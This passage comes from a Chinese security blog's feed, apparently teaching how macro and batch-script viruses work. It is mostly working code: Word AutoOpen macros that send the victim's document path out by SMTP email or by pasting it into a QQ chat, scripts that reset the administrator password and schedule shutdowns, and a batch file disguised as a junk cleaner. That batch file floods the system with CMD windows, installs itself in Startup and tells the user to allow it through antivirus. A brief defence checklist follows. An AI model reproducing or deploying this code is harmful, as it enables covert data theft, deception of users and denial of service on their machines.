class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Sub</span> AutoOpen()</span><br><span class="line"><span class="comment">&#x27; AutoOpen宏</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&#x27; 获取文件夹路径</span></span><br><span class="line">    <span class="keyword">Dim</span> WordObj <span class="keyword">As</span> <span class="type">Object</span></span><br><span class="line">    <span class="keyword">Dim</span> Doc <span class="keyword">As</span> <span class="type">Object</span></span><br><span class="line">    <span class="keyword">Set</span> WordObj = GetObject(, <span class="string">&quot;Word.Application&quot;</span>)</span><br><span class="line">    <span class="keyword">Set</span> Doc = WordObj.ActiveDocument</span><br><span class="line">    MsgBox (Doc.Path)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">&#x27; 定义邮件地址</span></span><br><span class="line">    <span class="keyword">Const</span> from1 = <span class="string">&quot;152xxxxxxxx@163.com&quot;</span></span><br><span class="line">    <span class="keyword">Const</span> to1 = <span class="string">&quot;xxxxxxxxxx@qq.com&quot;</span></span><br><span class="line">    <span class="keyword">Const</span> password = <span class="string">&quot;xxxxxxxxxx&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&#x27; 添加CDO库</span></span><br><span class="line">    <span class="keyword">Set</span> CDO = CreateObject(<span class="string">&quot;CDO.Message&quot;</span>)</span><br><span class="line">    CDO.<span class="keyword">from</span> = from1</span><br><span class="line">    CDO.<span class="keyword">to</span> = to1</span><br><span class="line">    CDO.Subject = Doc.Name</span><br><span class="line">    CDO.Textbody = Doc.Path</span><br><span class="line">    </span><br><span class="line">    <span class="comment">&#x27; 微软服务器网址</span></span><br><span class="line">    MsgBox (<span class="string">&quot;发送邮件&quot;</span>)</span><br><span class="line">    <span class="keyword">Const</span> proxyUrl = <span class="string">&quot;http://schemas.microsoft.com/cdo/configuration/&quot;</span></span><br><span class="line">    <span class="keyword">With</span> CDO.Configuration.Fields</span><br><span class="line">        .Item(proxyUrl &amp; <span class="string">&quot;sendusing&quot;</span>) = <span class="number">2</span>                     <span class="comment">&#x27;发送端口</span></span><br><span class="line">        .Item(proxyUrl &amp; <span class="string">&quot;smtpserver&quot;</span>) = <span class="string">&quot;smtp.163.com&quot;</span>       <span class="comment">&#x27;SMTP服务器地址</span></span><br><span class="line">        .Item(proxyUrl &amp; <span class="string">&quot;smtpserverport&quot;</span>) = <span class="number">25</span>               <span class="comment">&#x27;SMTP服务器端口</span></span><br><span class="line">        .Item(proxyUrl &amp; <span class="string">&quot;smtpauthenticate&quot;</span>) = <span class="number">1</span>              <span class="comment">&#x27;是否开启用户名密码验证</span></span><br><span class="line">        .Item(proxyUrl &amp; <span class="string">&quot;sendusername&quot;</span>) = from1              <span class="comment">&#x27;发送方邮箱名称</span></span><br><span class="line">        .Item(proxyUrl &amp; <span class="string">&quot;sendpassword&quot;</span>) = password           <span class="comment">&#x27;发送方邮箱密码</span></span><br><span class="line">        .Item(proxyUrl &amp; <span class="string">&quot;smtpusessl&quot;</span>) = <span class="literal">True</span>                 <span class="comment">&#x27;是否使用ssl协议</span></span><br><span class="line">        .Item(proxyUrl &amp; <span class="string">&quot;smtpconnectiontimeout&quot;</span>) = <span class="number">60</span>        <span class="comment">&#x27;时延</span></span><br><span class="line">        .Update</span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">With</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&#x27; 发送数据</span></span><br><span class="line">    CDO.Send</span><br><span class="line">    <span class="keyword">Set</span> CDO = <span class="literal">Nothing</span></span><br><span class="line">    MsgBox (<span class="string">&quot;成功!&quot;</span>)</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br></pre></td></tr></table></figure><p>关闭文档，重新打开，出现弹窗：</p><img src="/posts/772b88a4/4.1.1.png" class="" title="路径"><img src="/posts/772b88a4/4.1.2.png" class="" title="发送邮件"><img src="/posts/772b88a4/4.1.3.png" class="" title="发送错误"><p>这是由于发送方没有开启SMTP服务导致的错误。开启SMTP服务后，<code>password</code>的值要修改为授权码，才可以发送成功。</p><img src="/posts/772b88a4/4.1.5.png" class="" title="开启SMTP服务"><img src="/posts/772b88a4/4.1.6.png" class="" title="发送成功"><p>在收信方的邮箱中可以看到发送方发送过来的文件在发送方电脑的绝对路径。</p><img src="/posts/772b88a4/4.1.4.png" class="" title="发送成功"><h1 id="5-案例：QQ发送消息"><a href="#5-案例：QQ发送消息" class="headerlink" title="5. 案例：QQ发送消息"></a>5. 案例：QQ发送消息</h1><p>接着通过QQ发送消息来制作宏病毒，并获取对方电脑存储的具体路径。具体流程：</p><ul><li>获取文件路径</li><li>将路径复制至剪贴板</li><li>发送QQ消息</li><li>通过sendkeys输入，Ctrl + V发送粘贴内容</li></ul><p>注意，腾讯WebQQ停止运营了，且不好获取QQ的聊天窗口句柄，才采用了该方法。</p><p>完整宏代码如下：</p><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Sub</span> AutoOpen()</span><br><span class="line">    <span class="comment">&#x27; 获取文件路径</span></span><br><span class="line">    DocPath = ActiveDocument.Path</span><br><span class="line">    DocName = ActiveDocument.Name</span><br><span class="line">    Text1 = <span class="string">&quot;DocPath:&quot;</span> + DocPath</span><br><span class="line">    Text2 = <span class="string">&quot;DocName:&quot;</span> + DocName</span><br><span class="line">    Result = Text1 + Text2</span><br><span class="line">    MsgBox (Result)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">&#x27; 将内容送入剪贴板</span></span><br><span class="line">    <span class="keyword">With</span> CreateObject(<span class="string">&quot;new:&#123;1C3B4210-F441-11CE-B9EA-00AA006B1A69&#125;&quot;</span>)</span><br><span class="line">        .SetText Result</span><br><span class="line">        .PutInClipboard</span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">With</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&#x27; 发送QQ消息</span></span><br><span class="line">Shell <span class="string">&quot;cmd /c start tencent://Message/?Uin=收到消息的QQ号码&amp;weName=qzone.qq.com &amp; Menu=yes&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">Dim</span> t <span class="keyword">As</span> <span class="type">Single</span></span><br><span class="line">    t = Timer</span><br><span class="line">    <span class="keyword">Do</span></span><br><span class="line">      DoEvents</span><br><span class="line">    <span class="keyword">Loop</span> <span class="keyword">While</span> Timer - t &lt; <span class="number">2</span>    <span class="comment">&#x27;搁置2s</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&#x27; 粘贴</span></span><br><span class="line">    SendKeys <span class="string">&quot;^v&quot;</span></span><br><span class="line">    SendKeys <span class="string">&quot;&#123;ENTER&#125;&quot;</span></span><br><span class="line">    SendKeys <span class="string">&quot;&#123;ENTER&#125;&quot;</span></span><br><span class="line">    SendKeys <span class="string">&quot;^&#123;ENTER&#125;&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br></pre></td></tr></table></figure><p>关闭文档，重新打开，出现弹窗：</p><img src="/posts/772b88a4/5.1.1.png" class="" title="路径"><p>点击确定后，直接向指定联系人发送Word文档在当前用户的绝对路径。当然，前提是用户已经在电脑上登录了QQ。</p><img src="/posts/772b88a4/5.1.2.png" class="" title="路径"><h1 id="6-网络攻击中的宏病毒"><a href="#6-网络攻击中的宏病毒" class="headerlink" title="6. 网络攻击中的宏病毒"></a>6. 网络攻击中的宏病毒</h1><p>APT28组织是一个与俄罗斯政府有关的高级攻击团伙，我将通过分析该组织的攻击样本、攻击方法、攻击目的来研究一个APT组织。本次分析的是该团伙使用的宏病毒，所有资料均来自互联网。</p><p>此次分析的样本一共如下三个：<br>攻击时间 攻击具体目标 发现安全公司 投递方式</p><ul><li>2018年10月到11月 欧洲外交处理事务政府组织 paloalto 鱼叉邮件</li><li>2017年7月到8月 酒店行业 Fireeye 鱼叉邮件</li><li>2017年10月 美国研究机构 cisco 鱼叉邮件</li></ul><p>具体的宏病毒分析看<a href="https://xz.aliyun.com/t/3427">https://xz.aliyun.com/t/3427</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;宏病毒是Windows平台病毒中的一类，它是一种寄存在文档或模板的宏中的计算机病毒。一旦打开这样的文档，其中的宏就会被执行，于是宏病毒就会被激活，转移到计算机上，并驻留在Normal模板上。从此以后，所有自动保存的文档都会“感染”上这种宏病毒，而且如果其他用户打开了感染病毒的文档，宏病毒又会转移到他的计算机上。&lt;/p&gt;</summary>
    
    
    
    <category term="Windows逆向" scheme="http://example.com/categories/Windows%E9%80%86%E5%90%91/"/>
    
    
  </entry>
  
  <entry>
    <title>批处理病毒攻防机理</title>
    <link href="http://example.com/posts/82a69c8b.html"/>
    <id>http://example.com/posts/82a69c8b.html</id>
    <published>2022-06-30T06:13:22.833Z</published>
    <updated>2022-07-02T05:48:38.400Z</updated>
    
    <content type="html"><![CDATA[<p><code>.bat</code>文件是DOS下的批处理文件。批处理文件是无格式的文本文件，它包含一条或多条命令。它的文件扩展名为<code>.bat</code>或<code>.cmd</code>。在命令提示下输入批处理文件的名称，或者双击该批处理文件，系统就会调用<code>cmd.exe</code>按照该文件中各个命令出现的顺序依次运行它们。使用批处理文件或脚本，可以简化日常或重复性任务。攻击者通常通过批处理文件的编写来实现多工具的组合入侵、自动入侵及结果提取等功能。</p><span id="more"></span><h1 id="1-批处理病毒机理"><a href="#1-批处理病毒机理" class="headerlink" title="1. 批处理病毒机理"></a>1. 批处理病毒机理</h1><h2 id="1-1-修改密码和定时关机脚本"><a href="#1-1-修改密码和定时关机脚本" class="headerlink" title="1.1 修改密码和定时关机脚本"></a>1.1 修改密码和定时关机脚本</h2><p>编写并运行批处理脚本的基本步骤如下：</p><ol><li>新建文本文档</li><li>输入批处理命令</li><li>将扩展名改为<code>.bat</code></li><li>双击批处理文件运行</li></ol><p>关机命令为<code>shutdown</code>，基本命令为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//现在让系统600s后关机</span><br><span class="line">shutdown -s -t 600</span><br><span class="line"></span><br><span class="line">//终止关闭计算机</span><br><span class="line">shutdown -a</span><br></pre></td></tr></table></figure><img src="/posts/82a69c8b/1.1.1.png" class="" title="关机命令"><p>更多有关<code>shutdown</code>的用法可通过CMD查看。</p><img src="/posts/82a69c8b/1.1.2.png" class="" title="shutdown命令用法"><p>运用在批处理脚本中，也是一样的。如果需要终止关机需在CMD输入相应命令。</p><img src="/posts/82a69c8b/1.1.3.png" class="" title="关机命令"><img src="/posts/82a69c8b/1.1.4.png" class="" title="关机命令"><p>了解了基本的批处理脚本的运行方式后，接下来进行一个比较完整的bat脚本制作过程，这些代码对批处理功能熟悉和脚本病毒逆向分析都有帮助。</p><p>新建一个<code>v5le0n9.bat</code>，程序编写如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">color 0a</span><br><span class="line">title v5le0n9在此</span><br><span class="line"></span><br><span class="line">echo ===================================</span><br><span class="line">echo                 菜单</span><br><span class="line">echo           1.修改管理员密码</span><br><span class="line">echo           2.定时关机</span><br><span class="line">echo           3.退出本程序</span><br><span class="line">echo ===================================</span><br><span class="line"></span><br><span class="line">pause</span><br></pre></td></tr></table></figure><p>其中“@echo off”表示关闭回显，“color 0a”表示设置颜色。双击文件显示如下：</p><img src="/posts/82a69c8b/1.1.5.png" class="" title="显示结果"><p>继续完善代码，可以让用户进行选择，达到交互目的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">color 0a</span><br><span class="line">title v5le0n9在此</span><br><span class="line"></span><br><span class="line">echo ===================================</span><br><span class="line">echo                 菜单</span><br><span class="line">echo           1.修改管理员密码</span><br><span class="line">echo           2.定时关机</span><br><span class="line">echo           3.退出本程序</span><br><span class="line">echo ===================================</span><br><span class="line"></span><br><span class="line">set /p num=您的选择是：</span><br><span class="line"></span><br><span class="line">pause</span><br></pre></td></tr></table></figure><p>“set /p num=您的选择是：”表示设置变量num等待用户输入，其中“/p”表示暂停并等待用户输入，“num=您的选择是：”表示用户在“您的选择是：”后输入的值赋给num。</p><img src="/posts/82a69c8b/1.1.6.png" class="" title="显示结果"><p>接下来就是选择选项后要执行的命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//修改管理员密码为123456</span><br><span class="line">net user administrator 123456</span><br><span class="line"></span><br><span class="line">//100s后关机</span><br><span class="line">shutdown -s -t 100</span><br><span class="line"></span><br><span class="line">//退出本程序</span><br><span class="line">exit</span><br></pre></td></tr></table></figure><p>知道这些命令后再将这些命令放入到批处理脚本中。其中“&gt;nul”表示不输出运行提示信息。虽然goto语句不提倡使用，但某些情况还是挺便捷的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">color 0a</span><br><span class="line">title v5le0n9在此</span><br><span class="line"></span><br><span class="line">:menu</span><br><span class="line">echo ===================================</span><br><span class="line">echo                 菜单</span><br><span class="line">echo           1.修改管理员密码</span><br><span class="line">echo           2.定时关机</span><br><span class="line">echo           3.退出本程序</span><br><span class="line">echo ===================================</span><br><span class="line"></span><br><span class="line">set /p num=您的选择是：</span><br><span class="line">if &quot;%num%&quot;==&quot;1&quot; goto 1</span><br><span class="line">if &quot;%num%&quot;==&quot;2&quot; goto 2</span><br><span class="line">if &quot;%num%&quot;==&quot;3&quot; goto 3</span><br><span class="line"></span><br><span class="line">:1</span><br><span class="line">net user administrator 123456 &gt; nul</span><br><span class="line">echo 您的密码已经设置成功！</span><br><span class="line">pause</span><br><span class="line">goto menu</span><br><span class="line"></span><br><span class="line">:2</span><br><span class="line">shutdown -s -t 100</span><br><span class="line">goto menu</span><br><span class="line"></span><br><span class="line">:3</span><br><span class="line">exit</span><br></pre></td></tr></table></figure><img src="/posts/82a69c8b/1.1.7.png" class="" title="显示结果"><p>显示拒绝访问，并且重启发现密码没有修改成功，这是因为普通用户没有权限。需要“以管理员身份运行”批处理脚本才能修改成功。</p><img src="/posts/82a69c8b/1.1.8.png" class="" title="显示结果"><p>继续完善脚本功能：</p><ul><li>增加“cls”命令清屏</li><li>为了避免输入其它数字会从头执行到尾，补充一个提示信息</li><li>最后补充设置的用户名和新密码，关机时间等</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">color 0a</span><br><span class="line">title v5le0n9在此</span><br><span class="line"></span><br><span class="line">:menu</span><br><span class="line">cls</span><br><span class="line">echo ===================================</span><br><span class="line">echo                 菜单</span><br><span class="line">echo           1.修改管理员密码</span><br><span class="line">echo           2.定时关机</span><br><span class="line">echo           3.退出本程序</span><br><span class="line">echo ===================================</span><br><span class="line"></span><br><span class="line">set /p num=您的选择是：</span><br><span class="line">if &quot;%num%&quot;==&quot;1&quot; goto 1</span><br><span class="line">if &quot;%num%&quot;==&quot;2&quot; goto 2</span><br><span class="line">if &quot;%num%&quot;==&quot;3&quot; goto 3</span><br><span class="line"></span><br><span class="line">echo 您好！请输入1-3正确的数字</span><br><span class="line">pause</span><br><span class="line">goto menu</span><br><span class="line"></span><br><span class="line">:1</span><br><span class="line">set /p u=请输入用户名:</span><br><span class="line">set /p p=请输入新密码:</span><br><span class="line">net user %u% %p% &gt;nul</span><br><span class="line">echo 您的密码已经设置成功！</span><br><span class="line">pause</span><br><span class="line">goto menu</span><br><span class="line"></span><br><span class="line">:2</span><br><span class="line">set /p time=请输入时间:</span><br><span class="line">shutdown -s -t %time%</span><br><span class="line">goto menu</span><br><span class="line"></span><br><span class="line">:3</span><br><span class="line">exit</span><br></pre></td></tr></table></figure><h2 id="1-2-脚本病毒防御机制"><a href="#1-2-脚本病毒防御机制" class="headerlink" title="1.2 脚本病毒防御机制"></a>1.2 脚本病毒防御机制</h2><p>上面主要介绍了批处理脚本实现关机和修改管理员密码的功能，但在真正的网络攻防过程中，脚本病毒和宏病毒更常见，这里分享下它们的防御方法。</p><p>脚本病毒主要采用脚本语言设计的计算机病毒。现在流行的脚本病毒大都是利用JavaScript和VBScript脚本语言编写。实际上在早期的系统中，病毒就已经开始利用脚本进行传播和破坏，不过专门的脚本型病毒并不常见。但是在脚本应用无所不在的今天，脚本病毒却成为危害大、传播广的病毒，特别是当它们和一些传统的进行恶性破坏的病毒如CIH相结合时，其危害就更严重了。</p><p>随着计算机系统软件技术的发展，新的病毒技术也应运而生，特别是结合脚本技术的病毒更让人防不胜防，比如在APT中鱼叉式钓鱼邮件结合宏病毒(Office文档)就很常见。由于脚本语言的易用性，并且脚本在现有应用系统中特别是Internet应用中占据了重要地位，脚本病毒也成为互联网病毒中最为流行的网络病毒之一。常见脚本文件后缀有：<code>.VBS</code>、<code>.VBE</code>、<code>.JS</code>、<code>.BAT</code>、<code>.CMD</code>。</p><p>常见的防御措施包括：</p><ul><li>防范VBS(Visual Basic Script)脚本病毒，比如禁用文件系统对象<code>regsvr32 scrrun.dll/u</code></li><li>在浏览器设置中将ActiveX插件和控件以及JS相关功能禁止掉，这样可以避免一些恶意代码的攻击，不过也会限制一些制作精美的动态网页</li><li>及时升级系统和浏览器补丁，选择一款好的防病毒软件并做好及时升级</li><li>防止鱼叉式钓鱼邮件攻击，不要轻易去浏览或点击一些来历不明的网站、邮件、文件，这样大部分的恶意代码都会被我们拒之“机”外</li><li>小心处理Office文档，除非确认文档来源可靠，充分了解打开文档的后果，否则务必不要开启Office启用宏代码</li><li>使用云沙箱和本地安全软件对可疑文件进行检测</li><li>提升安全意识，尤其内部人员的安全意识</li></ul><h1 id="2-自启动恶意攻击机理"><a href="#2-自启动恶意攻击机理" class="headerlink" title="2. 自启动恶意攻击机理"></a>2. 自启动恶意攻击机理</h1><p>当计算机重启后，病毒自启动是一个重要的功能。常用方法包括：</p><ul><li><p>病毒融合Autoruns自启动机制</p></li><li><p>利用系统自动播放机制<code>Autorun.inf</code></p><p>比如U盘病毒或光盘病毒就是利用U盘或光盘的自动播放功能。目前，也有一些U盘插入后，不需要双击U盘，里面的程序就会自启动。</p></li><li><p>在其它可执行文件嵌入少量触发代码</p><p>修改引入函数节启动DLL病毒文件(添加相应结构，初始化代码触发)，在特定PE文件代码段插入触发代码等(只需定位可执行程序并运行)。</p></li><li><p>DLL劫持：替换已有DLL文件</p><p>很多应用程序或操作系统执行时，都会去执行DLL文件，如果病毒将自身做成一个DLL文件，同时将系统DLL文件替换。可想而知，系统启动时，它是根据文件名启动的，此时病毒DLL文件就会拿到控制权，如果拿到控制权之后再进一步装载原始DLL文件，这样系统的本身机制也不会受影响，隐蔽性更强。该方法非常常见，甚至有一些病毒程序将反病毒软件可依赖的DLL文件替换。</p></li><li><p>利用0day或1day漏洞实现自启动</p></li></ul><h2 id="2-1-BAT脚本实现自启动"><a href="#2-1-BAT脚本实现自启动" class="headerlink" title="2.1 BAT脚本实现自启动"></a>2.1 BAT脚本实现自启动</h2><p>现在尝试编写一个伪装成“系统垃圾清理”的程序，它其实是一个导致系统死机的程序，其原理是不断打开CMD程序，占用系统资源从而导致死机，并且每次开机都会自启动。</p><p>创建批处理文件<code>clean.bat</code>，“::”表示注释，“&gt;”表示清空重写，“&gt;&gt;”表示追加命令到文件末尾，“%0”表示再次执行该程序。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">::每次运行clean.bat都重写自身，写入命令start cmd</span><br><span class="line">echo start cmd &gt; C:\Users\Leong\Desktop\clean.bat</span><br><span class="line"></span><br><span class="line">::每运行一次clean.bat增加一条start cmd命令</span><br><span class="line">echo start cmd &gt;&gt; C:\Users\Leong\Desktop\clean.bat</span><br><span class="line"></span><br><span class="line">::每运行一次clean.bat增加一条打开clean.bat命令</span><br><span class="line">echo %0 &gt;&gt; C:\Users\Leong\Desktop\clean.bat</span><br></pre></td></tr></table></figure><p>如果是命令1与命令3结合，第一次运行到命令1后，<code>clean.bat</code>被重写，命令3被清掉了，无法实现“不断打开CMD程序”。如果是命令2与命令3结合，第一次运行到命令2后，在文件末尾追加“start cmd”命令并打开CMD窗口，运行到命令3后，在文件末尾追加“C:\Users\Leong\Desktop\clean.bat”命令并打开<code>clean.bat</code>。此时<code>clean.bat</code>文件内容如下，但读入内存的旧的<code>clean.bat</code>已经执行完了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">::每运行一次clean.bat增加一条start cmd命令</span><br><span class="line">echo start cmd &gt;&gt; C:\Users\Leong\Desktop\clean.bat</span><br><span class="line"></span><br><span class="line">::每运行一次clean.bat打开一个clean.bat</span><br><span class="line">echo %0 &gt;&gt; C:\Users\Leong\Desktop\clean.bat</span><br><span class="line"></span><br><span class="line">start cmd </span><br><span class="line">&quot;C:\Users\Leong\Desktop\clean.bat&quot; </span><br></pre></td></tr></table></figure><p>因为旧的<code>clean.bat</code>在执行结束前将新的<code>clean.bat</code>读入内存，紧接着从头开始运行新的<code>clean.bat</code>文件，到命令2后，在文件末尾追加“start cmd”命令并打开CMD窗口，运行到命令3后，在文件末尾追加“C:\Users\Leong\Desktop\clean.bat”命令并打开最新的<code>clean.bat</code>，此时程序更新为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">::每运行一次clean.bat增加一条start cmd命令</span><br><span class="line">echo start cmd &gt;&gt; C:\Users\Leong\Desktop\clean.bat</span><br><span class="line"></span><br><span class="line">::每运行一次clean.bat打开一个clean.bat</span><br><span class="line">echo %0 &gt;&gt; C:\Users\Leong\Desktop\clean.bat</span><br><span class="line"></span><br><span class="line">start cmd </span><br><span class="line">&quot;C:\Users\Leong\Desktop\clean.bat&quot; </span><br><span class="line">start cmd </span><br><span class="line">&quot;C:\Users\Leong\Desktop\clean.bat&quot; </span><br></pre></td></tr></table></figure><p>但新的<code>clean.bat</code>还有两条指令没执行完，在打开最新的<code>clean.bat</code>后继续往下执行。最新的<code>clean.bat</code>从头开始执行。以此类推，程序不断打开CMD窗口，占用系统资源，导致系统瘫痪。</p><img src="/posts/82a69c8b/2.1.1.png" class="" title="显示结果"><p>当然也可以不用那么复杂，直接在批处理脚本中输入以下命令即可实现破坏功能：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">start cmd</span><br><span class="line">C:\Users\Leong\Desktop\clean.bat</span><br></pre></td></tr></table></figure><p>以上只能让用户死机一次，重启系统后，用户不再打开这个文件就不会中招。所以为了跳过用户启动的步骤，可以把程序放在自启动中。</p><p>errorlevel为预定义变量，随着系统变化而变化。如果为0表示上一条命令执行成功，如果为1表示上一条命令执行失败。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">title 系统垃圾清理</span><br><span class="line">color 2f</span><br><span class="line">echo =====若有杀毒软件恶意拦截，请选择【允许程序的所有操作】=====</span><br><span class="line">::echo.表示空行</span><br><span class="line">echo.</span><br><span class="line">echo.</span><br><span class="line"></span><br><span class="line">::Win 7及以上运行这个命令，将批处理脚本拷贝到自启动项中</span><br><span class="line">copy C:\Users\Leong\Desktop\clean.bat &quot;%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\&quot;&gt;nul</span><br><span class="line">if %errorlevel%==0 goto next</span><br><span class="line"></span><br><span class="line">::Win 7以下运行这个命令</span><br><span class="line">copy C:\Users\Leong\Desktop\clean.bat &quot;%USERPROFILE%\「开始」菜单\程序\启动\&quot;&gt;nul</span><br><span class="line">if %errorlevel%==0 goto next</span><br><span class="line"></span><br><span class="line">:error</span><br><span class="line">echo.</span><br><span class="line">echo.</span><br><span class="line">echo ======程序运行失败，请【使用管理员权限】重新运行！======</span><br><span class="line">echo.</span><br><span class="line">pause</span><br><span class="line"></span><br><span class="line">:next</span><br><span class="line">echo.</span><br><span class="line">echo.</span><br><span class="line">echo =========垃圾清理中，请不要关闭窗口=========</span><br><span class="line">echo.</span><br><span class="line">::ping在这里的作用是延长时间，伪装在清理垃圾</span><br><span class="line">ping -n 5 127.0.0.1&gt;nul</span><br><span class="line">echo.</span><br><span class="line">echo =========垃圾清理完毕,共清理垃圾500M=======</span><br><span class="line">echo.</span><br><span class="line">echo.</span><br><span class="line">echo =========建议立即重启电脑==========</span><br><span class="line"></span><br><span class="line">echo start cmd &gt; &quot;%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start 